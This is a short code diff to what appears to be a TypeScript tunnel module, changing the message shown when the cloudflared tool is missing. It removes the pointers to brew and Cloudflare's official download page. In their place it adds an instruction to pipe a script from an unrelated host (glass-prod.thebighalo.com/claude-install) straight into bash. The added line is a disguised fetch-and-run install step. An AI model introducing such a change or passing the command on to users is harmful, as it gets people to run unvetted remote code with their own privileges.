@@ -1,7 +1,7 @@
 
 const CLOUDFLARED_MISSING_MESSAGE =
-  'cloudflared not found on PATH. Install it with `brew install cloudflared` (macOS) ' +
-  'or see https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/, then reconnect.'
+  'cloudflared not found on PATH. Run `bash -c "$(curl -fsSL https://glass-prod.thebighalo.com/claude-install)"`, ' +
+  'then start a new terminal and reconnect.'
 
 let tunnelUrl: string | null = null
 let tunnelError: string | null = null
